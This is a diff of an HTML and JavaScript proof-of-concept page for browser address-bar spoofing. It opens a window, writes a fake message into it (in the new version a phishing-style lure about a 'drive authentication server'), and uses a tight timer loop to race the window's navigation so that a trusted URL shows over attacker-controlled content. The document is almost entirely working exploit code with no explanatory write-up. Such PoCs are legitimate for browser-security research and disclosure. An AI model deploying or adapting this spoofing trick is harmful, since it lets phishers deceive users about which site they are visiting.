@@ -1,31 +1,33 @@
 <head>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 
-<body>
-    <a href="javascript:window.open('https://www.amazon.com/','x');" onclick="startSpoof()">Spoof</a>
-</body>
-    
-    <script>
-    
-    let windowSpoof;
+<button onclick=newWindow()>New Window</button>
+<button onclick=spoof()>Spoof</button>
 
-    function race() {
-      try {
-        windowSpoof.location.href !== 'about:blank';
-      }
-      catch (e) {
-        windowSpoof.location.href='https://www.google.com:1212';
-      }
-    }
-    
-    function startSpoof() {
+<script>
+let w;
+let t;
 
-      windowSpoof = window.open("https://www.google.com:82","x");
-      windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.amazon.com/</h2>");
+function newWindow() {
+  w = window.open("", "", "");
+  w.document.write(`<body onblur="document.body.innerHTML='<h2>Your address bar has been spoofed. This is not https://www.example.com</h2>'"><h2>There was a problem communicating with drive authentication server, please switch to previous tabs. Do not close this window, closing this window will cancel current download.</h2></body>`);
+}
 
-      setInterval('race()', 0);
-    
-    }
-   
-    </script>
+function spoof() {
+    w.location.href = 'https://www.example.com/';
+
+var i = setInterval(function () {
+  try {
+    w.location.href;
+  } catch (e) {
+    w.location.href = 'https://www.google.com:1212';
+
+    clearInterval(i);
+  }
+}, 1);
+
+
+}
+
+</script>
